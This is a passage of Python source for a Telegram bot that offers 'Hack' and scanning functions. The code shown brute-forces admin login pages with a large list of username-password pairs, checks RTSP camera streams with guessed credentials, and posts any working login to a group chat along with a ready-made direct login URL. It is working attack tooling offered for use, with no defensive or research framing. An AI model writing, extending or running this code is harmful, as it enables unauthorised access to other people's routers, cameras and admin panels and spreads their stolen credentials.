    data = query.data.split("_")
    ip = data[1]
    port = int(data[2])
    admin_id = data[3] if len(data) > 3 else None

    admin_urls = context.user_data.get("admin_urls", {})
    admin_url = admin_urls.get(admin_id) if admin_id and admin_id in admin_urls else None

    if not admin_url:
        await query.message.reply_text(
            "No valid admin URL found to brute-force. Use 'Check Link' button.",
            reply_markup=main_menu_markup()
        )
        return

    context.user_data["brute_force_running"] = True
    await query.message.reply_text(f"🔥 Trying 2000+ username-password combos on {admin_url}...")

    total_combos = len(BRUTE_COMBOS)
    checked = 0
    progress_message = await query.message.reply_text("Starting brute-force...")
    progress_button = await query.message.reply_text(
        "Progress: 0%",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("Progress: 0%", callback_data="progress_dummy"),
            InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{admin_id or 'all'}")
        ]])
    )

    semaphore = asyncio.Semaphore(5)
    async def try_creds(url: str, username: str, password: str) -> tuple[bool, str]:
        async with semaphore:
            try:
                async with ClientSession(timeout=ClientTimeout(total=5)) as session:
                    async with session.post(
                        url,
                        data={"username": username, "password": password},
                        ssl=False,
                        allow_redirects=True
                    ) as response:
                        if response.status != 200:
                            return False, ""
                        html = await response.text()
                        if "login" in html.lower() or "password" in html.lower():
                            return False, ""
                        if response.url.path != urlparse(url).path and any(
                            keyword in response.url.path.lower() for keyword in ["dashboard", "admin", "panel"]
                        ):
                            direct_url = f"http://{username}:{password}@{ip}:{port}{urlparse(url).path}"
                            return True, direct_url
                        if any(keyword in html.lower() for keyword in ["dashboard", "admin", "welcome"]):
                            direct_url = f"http://{username}:{password}@{ip}:{port}{urlparse(url).path}"
                            return True, direct_url
                        return False, ""
            except Exception as e:
                logger.error(f"Brute force error for {url}: {e}")
                return False, ""

    found = False
    found_credentials = None
    direct_login_url = ""

    for username, password in BRUTE_COMBOS:
        if not context.user_data.get("brute_force_running", False) or context.bot_data.get("stop_all", False):
            break
        success, direct_url = await try_creds(admin_url, username, password)
        checked += 1
        if success:
            found = True
            found_credentials = (username, password)
            direct_login_url = direct_url
            context.user_data["brute_force_running"] = False
            break
        if checked % 100 == 0:
            progress = (checked / total_combos) * 100
            try:
                await context.bot.edit_message_reply_markup(
                    chat_id=progress_button.chat_id,
                    message_id=progress_button.message_id,
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton(f"Progress: {progress:.0f}%", callback_data="progress_dummy"),
                        InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{admin_id or 'all'}")
                    ]])
                )
                await context.bot.edit_message_text(
                    chat_id=progress_message.chat_id,
                    message_id=progress_message.message_id,
                    text=f"Progress: {progress:.0f}% ({checked}/{total_combos} combos)"
                )
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.error(f"Progress update error: {e}")

    try:
        await context.bot.delete_message(
            chat_id=progress_message.chat_id,
            message_id=progress_message.message_id
        )
        await context.bot.delete_message(
            chat_id=progress_button.chat_id,
            message_id=progress_button.message_id
        )
    except Exception as e:
        logger.error(f"Delete message error: {e}")

    if found:
        await query.message.reply_text(
            f"🎯 Found: {found_credentials[0]}:{found_credentials[1]}\nURL: {admin_url}\nDirect Login: {direct_login_url}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Login", url=direct_login_url), InlineKeyboardButton("Main Menu", callback_data="main_menu")]])
        )
        try:
            await context.bot.send_message(
                chat_id=GROUP_CHAT_ID,
                text=f"🎯 Found for {ip}:{port}!\n{found_credentials[0]}:{found_credentials[1]}\n{admin_url}\nDirect Login: {direct_login_url}",
                parse_mode="Markdown"
            )
            await asyncio.sleep(0.1)
        except Exception as e:
            logger.error(f"Group send error: {e}")
    else:
        final_text = f"❌ No credentials found. Checked {checked}/{total_combos}" if context.user_data.get("brute_force_running", False) else f"🛑 Stopped! Checked {checked}/{total_combos}"
        await query.message.reply_text(final_text, reply_markup=main_menu_markup())

    context.user_data["brute_force_running"] = False

async def stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return
    query = update.callback_query
    await query.answer()
    context.user_data["brute_force_running"] = False
    await query.message.reply_text("🛑 Brute-force stopped.", reply_markup=main_menu_markup())

async def check_port(ip: str, port: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception as e:
        logger.error(f"Port check error: {e}")
        return False

async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tuple[bool, str]:
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        request = f"DESCRIBE rtsp://{ip}:{port}/live RTSP/1.0\r\nCSeq: 1\r\n"
        if username and password:
            auth = f"{username}:{password}".encode('ascii')
            auth_b64 = base64.b64encode(auth).decode('ascii')
            request += f"Authorization: Basic {auth_b64}\r\n"
        request += "\r\n"
        writer.write(request.encode('ascii'))
        await writer.drain()
        response = await asyncio.wait_for(reader.read(1024), timeout=3)
        response_str = response.decode('ascii', errors='ignore')
        writer.close()
        await writer.wait_closed()
        return "RTSP/1.0 200 OK" in response_str, "Success" if "200 OK" in response_str else response_str[:50]
    except Exception as e:
        return False, str(e)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return ConversationHandler.END
    context.user_data.clear()
    await update.message.reply_text("Cancelled. Use /start or /hack.", reply_markup=main_menu_markup())
    return ConversationHandler.END

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE, message=None) -> None:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return
    logger.debug("Status check")
    reply_text = "Bot online! Use /start, /hack, or buttons."
    if message:
        await message.reply_text(reply_text, reply_markup=main_menu_markup())
    else:
        await update.message.reply_text(reply_text, reply_markup=main_menu_markup())

def main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Hack", callback_data="start_hack")],
        [InlineKeyboardButton("Vuln Scan", callback_data="vuln_scan")],
        [InlineKeyboardButton("Check Link", callback_data="check_link")],
        [InlineKeyboardButton("Status", callback_data="status")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ])

async def keep_alive():
    import http.server
    import socketserver
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/health":
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")
            else:
                self.send_response(404)
                self.end_headers()
    server = socketserver.TCPServer(("", KEEP_ALIVE_PORT), Handler)
    logger.info(f"Keep-alive on port {KEEP_ALIVE_PORT}")
    server.serve_forever()

def run_keep_alive(loop):
    asyncio.set_event_loop(loop)
    loop.run_until_complete(keep_alive())

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CommandHandler("hack", hack),
            CommandHandler("vuln", vuln_scan_callback),
            CallbackQueryHandler(start_hack_callback, pattern="^start_hack$"),
            CallbackQueryHandler(special_scan_callback, pattern="^special_scan$"),
            CallbackQueryHandler(brute_force_callback, pattern="^brute_force$"),
            CallbackQueryHandler(vuln_scan_callback, pattern="^vuln_scan$"),
            CallbackQueryHandler(check_link_callback, pattern="^check_link$"),
            CallbackQueryHandler(status_callback, pattern="^status$"),
            CallbackQueryHandler(help_callback, pattern="^help$"),
            CallbackQueryHandler(main_menu_callback, pattern="^main_menu$"),
        ],
        states={
            IP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ip),
                CallbackQueryHandler(start_hack_callback, pattern="^start_hack$"),
                CallbackQueryHandler(special_scan_callback, pattern="^special_scan$"),
                CallbackQueryHandler(brute_force_callback, pattern="^brute_force$"),
                CallbackQueryHandler(vuln_scan_callback, pattern="^vuln_scan$"),
                CallbackQueryHandler(check_link_callback, pattern="^check_link$"),
                CallbackQueryHandler(status_callback, pattern="^status$"),
                CallbackQueryHandler(main_menu_callback, pattern="^main_menu$"),
                CallbackQueryHandler(help_callback, pattern="^help$"),
            ],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
            VULN_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, vuln_input)],
            VULN_PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, vuln_port)],
            CHECK_LINK_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("reboot", reboot))
    application.add_handler(CallbackQueryHandler(hunt_password, pattern="^hunt_"))
    application.add_handler(CallbackQueryHandler(stop_brute_force, pattern="^stop_"))

    import threading
    keep_alive_loop = asyncio.new_event_loop()
    threading.Thread(target=run_keep_alive, args=(keep_alive_loop,), daemon=True).start()

    application.run_polling()

if __name__ == "__main__":
    main()
